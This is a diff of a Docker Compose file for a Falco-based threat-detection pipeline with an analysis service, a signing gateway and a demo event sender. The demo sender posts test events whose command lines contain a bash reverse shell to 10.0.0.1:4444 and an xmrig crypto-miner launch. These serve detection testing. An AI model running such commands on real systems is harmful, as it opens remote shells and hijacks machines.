@@ -1,28 +1,52 @@
 services:
+  gateway:
+    build:
+      context: ../kernelharbor-openclaw
+      dockerfile: ../deploy/Dockerfile.gateway
+    ports:
+      - "8181:8181"
+      - "28080:28080"
+      - "28079:28079"
+    environment:
+      KH_DASHBOARD_PORT: "8181"
+      KH_ANALYSIS_HTTP_ADDR: "analysis:8080"
+      KH_PLUGIN_CONFIG: >-
+        {"analysisAddr":"analysis:9090","dashboardPort":8181,"autoStart":true,
+        "falcoSidekickPort":2801,"falcoWebhookPort":28080,"signerPort":28079,
+        "signingSecret":"${KH_SIGNING_SECRET:-kh-demo-secret}"}
+    volumes:
+      - ../kernelharbor-openclaw/rules:/app/rules:ro
+    depends_on:
+      analysis:
+        condition: service_started
+    networks:
+      - kernelharbor
+    restart: unless-stopped
+
   analysis:
     image: kernelharbor/analysis:latest
     build:
       context: ..
       dockerfile: deploy/Dockerfile.analysis
     ports:
-      - "9090:9090"
       - "8080:8080"
+      - "9090:9090"
     environment:
       GRPC_ADDRESS: ":9090"
       HTTP_ADDRESS: ":8080"
       PROTOCOL: "both"
       KH_API_KEY: "${KH_API_KEY:-}"
-      ES_ADDRESSES: "${ES_ADDRESSES:-http://elasticsearch:9200}"
+      ES_ADDRESSES: "http://elasticsearch:9200"
       LLM_BACKEND: "${KH_LLM_BACKEND:-none}"
       LLM_THRESHOLD: "${LLM_THRESHOLD:-0.6}"
-      OLLAMA_ADDRESS: "${OLLAMA_ADDRESS:-http://ollama:11434}"
+      OLLAMA_ADDRESS: "http://ollama:11434"
       OLLAMA_MODEL: "${OLLAMA_MODEL:-qwen2.5:7b}"
     depends_on:
       elasticsearch:
         condition: service_healthy
-    restart: unless-stopped
     networks:
       - kernelharbor
+    restart: unless-stopped
 
   elasticsearch:
     image: docker.elastic.co/elasticsearch/elasticsearch:8.17.4
@@ -43,10 +67,22 @@ services:
       - kernelharbor
     restart: unless-stopped
 
+  falcosidekick:
+    image: falcosecurity/falcosidekick:latest
+    ports:
+      - "2801:2801"
+    environment:
+      LISTENPORT: "2801"
+      DEBUG: "${FALCOSIDEKICK_DEBUG:-true}"
+      WEBHOOK_ADDRESS: "http://gateway:28079/falco/event"
+    depends_on:
+      - gateway
+    networks:
+      - kernelharbor
+    restart: unless-stopped
+
   falco:
     image: falcosecurity/falco:latest
-    profiles:
-      - falco
     privileged: true
     pid: host
     volumes:
@@ -60,30 +96,12 @@ services:
       falco -r /etc/falco/rules.d/kernelharbor-rules.yaml
       -o json_output=true
       -o json_include_output_property=false
+      -o json_include_tags_property=true
+      -o stdout_output.enabled=false
       -o http_output.enabled=true
       -o http_output.url=http://falcosidekick:2801/
     depends_on:
       - falcosidekick
-    networks:
-      - kernelharbor
-    restart: unless-stopped
-
-  falcosidekick:
-    image: falcosecurity/falcosidekick:latest
-    profiles:
-      - falco
-    ports:
-      - "2801:2801"
-    environment:
-      LISTENPORT: "2801"
-      DEBUG: "${FALCOSIDEKICK_DEBUG:-true}"
-    # In Docker Compose, events flow: Falco → falcosidekick → logs.
-    # For the full pipeline (conversion + analysis), run the OpenClaw plugin
-    # alongside, which provides a HMAC signer on port 28079 and webhook receiver on port 28080.
-    # Configure falcosidekick to forward through the signer:
-    #   WEBHOOK_ADDRESS: "http://host.docker.internal:28079/falco/event"
-    # Also set KH_SIGNING_SECRET on the gateway/plugin side to match the signing key.
-    depends_on: []
     networks:
       - kernelharbor
     restart: unless-stopped
@@ -99,6 +117,26 @@ services:
     restart: unless-stopped
     profiles:
       - llm
+
+  demo-sender:
+    image: curlimages/curl:latest
+    profiles:
+      - demo
+    depends_on:
+      - analysis
+    networks:
+      - kernelharbor
+    entrypoint: >
+      sh -c '
+        echo "Sending demo events to analysis..."
+        TS=$$(date -u +"%%Y-%%m-%%dT%%H:%%M:%%S.000Z")
+        curl -s -X POST http://analysis:8080/ingest -H "Content-Type: application/json" -d "[{\"@timestamp\":\"$$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\",\"image.path\":\"/usr/bin/bash\",\"process.pid\":3001,\"parent.pid\":1,\"user.name\":\"nobody\"}]"
+        sleep 2
+        curl -s -X POST http://analysis:8080/ingest -H "Content-Type: application/json" -d "[{\"@timestamp\":\"$$TS\",\"host.name\":\"demo-box\",\"event.type\":\"execve\",\"command.line\":\"/tmp/.hidden/xmrig --url=stratum+tcp://pool.minexmr.com:443\",\"image.path\":\"/tmp/.hidden/xmrig\",\"process.pid\":4001,\"parent.pid\":1,\"user.name\":\"nobody\"}]"
+        sleep 2
+        echo "Demo events sent. Check dashboard: http://localhost:8181"
+        curl -s http://analysis:8080/api/alerts?since=24h | head -c 500
+      '
 
 volumes:
   es-data:
